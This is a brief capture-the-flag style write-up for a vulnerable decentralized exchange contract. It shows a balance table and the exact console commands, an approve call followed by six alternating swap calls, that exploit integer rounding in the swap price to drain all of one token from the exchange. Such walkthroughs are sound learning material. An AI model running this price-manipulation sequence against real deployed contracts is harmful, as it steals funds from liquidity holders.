We must get all tokens of one of the two types token 1 or token 2. 
Also we must keep in mind that there is no fraction in solidity, you cannot get 1.222 it will round it to 1.

Here we will swap betweeen token 1 for token 2 and token 2 for token 1 and so on...

      DEX       |        player  
token1 - token2 | token1 - token2
----------------------------------
  100     100   |   10      10
  110     90    |   0       20    
  86      110   |   24      0    
  110     80    |   0       30    
  69      110   |   41      0    
  110     45    |   0       65   
  0       90    |   110     20

We will do this by calling:
await contract.approve(contract.address, 500)

t1 = await contract.token1()
t2 = await contract.token2()

await contract.swap(t1, t2, 10)
await contract.swap(t2, t1, 20)
await contract.swap(t1, t2, 24)
await contract.swap(t2, t1, 30)
await contract.swap(t1, t2, 41)
await contract.swap(t2, t1, 45)

Now we win :)